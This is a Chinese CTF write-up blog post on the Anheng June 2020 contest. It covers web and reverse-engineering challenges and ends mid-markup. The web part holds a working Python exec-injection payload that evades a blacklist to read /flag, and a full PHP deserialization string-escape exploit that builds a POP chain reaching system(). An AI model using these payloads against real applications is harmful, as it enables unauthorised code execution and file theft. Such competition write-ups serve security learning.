@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-cn">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,reverse,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言这次比赛出了三道web，两道逆向，一道逆向基本解出，算是近期来做的最不错的一次了。但是细细分析下来还有很多值得深究的地方。 web简单的计算机1，2这题说起来感觉就是黑名单没做好，实际上1，2可以用一个payload。考的是python代码注入，由于1，2均没有过滤exec，所以考虑用open加上read函数的组合读取文件内容，并通过exec将文件内容输入到session内，并带出，代码给的是">
+<meta name="keywords" content="ctf,web,reverse">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安恒6月赛总结">
+<meta property="og:url" content="http://www.star123.top/2020/06/27/安恒6月赛总结/index.html">
+<meta property="og:site_name" content="star&#39;s blog">
+<meta property="og:description" content="前言这次比赛出了三道web，两道逆向，一道逆向基本解出，算是近期来做的最不错的一次了。但是细细分析下来还有很多值得深究的地方。 web简单的计算机1，2这题说起来感觉就是黑名单没做好，实际上1，2可以用一个payload。考的是python代码注入，由于1，2均没有过滤exec，所以考虑用open加上read函数的组合读取文件内容，并通过exec将文件内容输入到session内，并带出，代码给的是">
+<meta property="og:locale" content="zh-cn">
+<meta property="og:image" content="https://i.loli.net/2020/06/27/rtCnzF2ceJ4Tuf9.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/27/CVF7SfnDxY6Ht51.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/27/IsoWNgOiQhBdTjm.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/27/q5exYPVsUElIga8.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/27/4F56YZdjlmDIy2g.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/27/M4mgCupx3iQEBRI.png">
+<meta property="og:updated_time" content="2020-06-27T05:20:58.514Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="安恒6月赛总结">
+<meta name="twitter:description" content="前言这次比赛出了三道web，两道逆向，一道逆向基本解出，算是近期来做的最不错的一次了。但是细细分析下来还有很多值得深究的地方。 web简单的计算机1，2这题说起来感觉就是黑名单没做好，实际上1，2可以用一个payload。考的是python代码注入，由于1，2均没有过滤exec，所以考虑用open加上read函数的组合读取文件内容，并通过exec将文件内容输入到session内，并带出，代码给的是">
+<meta name="twitter:image" content="https://i.loli.net/2020/06/27/rtCnzF2ceJ4Tuf9.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.star123.top/2020/06/27/安恒6月赛总结/">
+
+
+
+
+
+  <title>安恒6月赛总结 | star's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">star's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2020/06/27/安恒6月赛总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="star">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="star's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">安恒6月赛总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-27T12:14:51+08:00">
+                2020-06-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛出了三道web，两道逆向，一道逆向基本解出，算是近期来做的最不错的一次了。但是细细分析下来还有很多值得深究的地方。</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单的计算机1，2"><a href="#简单的计算机1，2" class="headerlink" title="简单的计算机1，2"></a>简单的计算机1，2</h3><p>这题说起来感觉就是黑名单没做好，实际上1，2可以用一个payload。考的是python代码注入，由于1，2均没有过滤exec，所以考虑用open加上read函数的组合读取文件内容，并通过exec将文件内容输入到session内，并带出，代码给的是1的，但是黑名单就写2 fuzz出来的结果好了。</p>
+<p>关键代码如下（1的代码，2也差不多，用这个思路不影响）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">calc_result = str((eval(input_question + <span class="string">"="</span> + str(input))))</span><br><span class="line">            <span class="keyword">if</span> calc_result == <span class="string">'True'</span>:</span><br><span class="line">                result = <span class="string">"Congratulations"</span></span><br><span class="line">            <span class="keyword">elif</span> calc_result == <span class="string">'False'</span>:</span><br><span class="line">                result = <span class="string">"Error"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">except</span> Error <span class="keyword">as</span> e:</span><br><span class="line">            result = <span class="string">"Invalid"</span></span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">'answer='</span>+result+<span class="string">' '</span>+<span class="string">'question='</span>+create_question)</span><br></pre></td></tr></table></figure>
+
+<p>随便试了下过滤了，read 函数，eval 函数，or 关键词。</p>
+<p>发现and，exec没有过滤。exec中可以执行等式赋值，而session是flask的全局变量。考虑使用正确结果 and exec来读取文件，黑名单可以用字符拼接来过。</p>
+<p>最后payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx <span class="keyword">and</span> exec(<span class="string">"""session["question"]=(op"""</span>+<span class="string">"""en("/fl"""</span>+<span class="string">"""ag").re"""</span>+<span class="string">"""ad())"""</span>)</span><br></pre></td></tr></table></figure>
+
+<p>提交payload，最后解密cookie即可。</p>
+<h3 id="phpunt"><a href="#phpunt" class="headerlink" title="phpunt"></a>phpunt</h3><p>这题其实是个网鼎杯加上4月月赛的套娃。</p>
+<p>主要是用php反序列化中大写S的时候可以使用16进制替代字符的特性来绕过黑名单。</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">······</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>] ;</span><br><span class="line">    $user = <span class="keyword">new</span> User($username, $password);</span><br><span class="line">    $_SESSION[<span class="string">'info'</span>] = add(serialize($user));</span><br><span class="line"></span><br><span class="line">    redirect(<span class="string">'info.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>pop链非常明显，Hacker_A触发_destruct中,stristr触发Hacker_B的_toString，而$tmp最后触发Hacker_C的invoke方法。</p>
+<p>class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username;</span><br><span class="line">    <span class="keyword">protected</span> $password;</span><br><span class="line">    <span class="keyword">protected</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username, $password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker_A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c2e38;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($c2e38)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c2e38 = $c2e38;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;c2e38, <span class="string">"admin"</span>) === <span class="keyword">False</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">"must be admin"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">"good luck"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker_B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c2e38;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($c2e38)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c2e38 = $c2e38;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_c2e38</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;c2e38;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tmp = <span class="keyword">$this</span>-&gt;get_c2e38();</span><br><span class="line">        $tmp();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'test'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker_C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">'test'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump(system(<span class="string">'cat /flag'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//functions.pp</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0*\0'</span>, $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reduce</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stristr($data, <span class="string">'c2e38'</span>) !== <span class="keyword">False</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'exit'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">···</span><br><span class="line"><span class="comment">//info.php</span></span><br><span class="line"><span class="comment">//\\0*\\0到 chr(0).*.chr(0)可以吞掉两个字符。</span></span><br><span class="line">check(reduce($_SESSION[<span class="string">'info'</span>]));</span><br><span class="line">$tmp = unserialize(reduce($_SESSION[<span class="string">'info'</span>]));</span><br></pre></td></tr></table></figure>
+
+<p>exp如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username;</span><br><span class="line">    <span class="keyword">protected</span> $password;</span><br><span class="line">    <span class="keyword">protected</span> $admin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker_A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c2e38;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker_B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c2e38;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($c2e38)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c2e38 = $c2e38;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker_C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">'test'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0*\0'</span>, $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reduce</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$s2 = <span class="string">'O:8:"Hacker_A":1:&#123;S:5:"c2e3\38";O:8:"Hacker_B":1:&#123;S:5:"c2e3\38";O:8:"Hacker_C":1:&#123;s:4:"name";s:4:"test";&#125;&#125;&#125;'</span>;</span><br><span class="line">$padding = <span class="string">'\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0\\0*\\0\\0\\0*\\0'</span>;</span><br><span class="line">$s1 = <span class="string">'11";s:11:"'</span> . chr(<span class="number">0</span>) . <span class="string">"*"</span> . chr(<span class="number">0</span>) . <span class="string">'password";O:8:"Hacker_A":1:&#123;S:5:"c2e3\38";O:8:"Hacker_B":1:&#123;S:5:"c2e3\38";O:8:"Hacker_C":1:&#123;s:4:"name";s:4:"test";&#125;&#125;&#125;'</span>;</span><br><span class="line">$u = <span class="keyword">new</span> User($padding, $s1);</span><br><span class="line">$u1 = serialize($u);</span><br><span class="line">$u2 = reduce(add($u1));</span><br><span class="line"><span class="keyword">echo</span> urlencode($padding) . PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> urlencode($s1);</span><br></pre></td></tr></table></figure>
+
+<p>$padding 是username的输入，而$s1 作为password的输入，将原来的password覆盖为hacker对象。</p>
+<p><img src="https://i.loli.net/2020/06/27/rtCnzF2ceJ4Tuf9.png" alt="image.png"></p>
+<p>跳转后</p>
+<p><img src="https://i.loli.net/2020/06/27/CVF7SfnDxY6Ht51.png" alt="image.png"></p>
+<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="easymaze"><a href="#easymaze" class="headerlink" title="easymaze"></a>easymaze</h3><p>白给的迷宫题，就进去之后把100大小的数组拷贝出来0代表路，O代表墙，hujk代表左，上，下，右即可。 </p>
+<p>从 左上角出发</p>
+<p>0OOOO0000#</p>
+<p>000OO0OOOO</p>
+<p>OO0OO0000O</p>
+<p>O00OOOOO0O</p>
+<p>O0OOOO000O</p>
+<p>O00OO00OOO</p>
+<p>OO0OO0OOOO</p>
+<p>OO0000OOOO</p>
+<p>OOOOOOOOOO</p>
+<p>OOOOOOOOOO</p>
+<p>最后结果是 jkkjjhjjkjjkkkuukukkuuhhhuukkkk</p>
+<p>MD5一下就是flag</p>
+<h3 id="pyc修复题"><a href="#pyc修复题" class="headerlink" title="pyc修复题"></a>pyc修复题</h3><p>这题主要是改了下load constant变量那里的值，然后直接看opcode 写出原本代码来处理的。</p>
+<p>这里主要参考了这几篇东西。<br><a href="https://wiki.x10sec.org/misc/other/pyc/#pycdc" target="_blank" rel="noopener">https://wiki.x10sec.org/misc/other/pyc/#pycdc</a></p>
+<p><a href="http://unpyc.sourceforge.net/Opcodes.html" target="_blank" rel="noopener">http://unpyc.sourceforge.net/Opcodes.html</a></p>
+<p><a href="https://github.com/python/cpython/blob/fc7df0e664198cb05cafd972f190a18ca422989c/Include/opcode.h#L69" target="_blank" rel="noopener">https://github.com/python/cpython/blob/fc7df0e664198cb05cafd972f190a18ca422989c/Include/opcode.h#L69</a></p>
+<p>首先简单地介绍下pyc的结构，</p>
+<ol>
+<li>最开始4个字节是一个Maigc int, 标识此pyc的版本信息。</li>
+<li>之后的4个字节代表了创建时间。</li>
+<li>8个字节之后都是序列化的 PyCodeObject</li>
+</ol>
+<p>使用了pycdas工具对python字节码进行反汇编，还原python opcode。</p>
+<p>没有处理过的pyc文件第2条opcode有点问题</p>
+<p><img src="https://i.loli.net/2020/06/27/IsoWNgOiQhBdTjm.png" alt="image.png"></p>
+<p>修复字节0020h的4，5字节全部改为0即可</p>
+<p><img src="https://i.loli.net/2020/06/27/q5exYPVsUElIga8.png" alt="image.png"></p>
+<p>依次还原py代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM='</span></span><br><span class="line">flag = raw_input(<span class="string">'Are u ready?'</span>)</span><br><span class="line">c = base64.b64encode(flag)</span><br><span class="line"><span class="comment"># 有问题</span></span><br><span class="line">d = list(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    d[i] = d[i]+<span class="string">'a'</span></span><br><span class="line">ohh = <span class="string">''</span>.join(d)</span><br><span class="line"><span class="keyword">if</span> ohh == a:</span><br><span class="line">    print(<span class="string">'yes'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>很显然，flag是一段被混淆的base64，只需要将前32位中的偶数位的a全部删除就是原本的base64</p>
+<h3 id="magia"><a href="#magia" class="headerlink" title="magia"></a>magia</h3><p>ida f5 核心逻辑如下：</p>
+<p><img src="https://i.loli.net/2020/06/27/4F56YZdjlmDIy2g.png" alt="image.png"></p>
+<p>有三个数组，来验证输入。</p>
+<p>归纳一下，输入是个32位的字符串，输入要满足三个条件：</p>
+<ol>
+<li>input[i]^input[31-i]==a1[i]</li>
+<li>input[i]&amp;input[31-i]==a2[i]</li>
+<li>input[i]&amp;0xF==a3[i]</li>
+</ol>
+<p>然后最后结果又要是</p>
+<p>Nep{xxx}这样的形式</p>
+<p><img src="https://i.loli.net/2020/06/27/M4mgCupx3iQEBRI.png" alt="image.png"></p>
+<p>然后无脑地写了个爆破脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 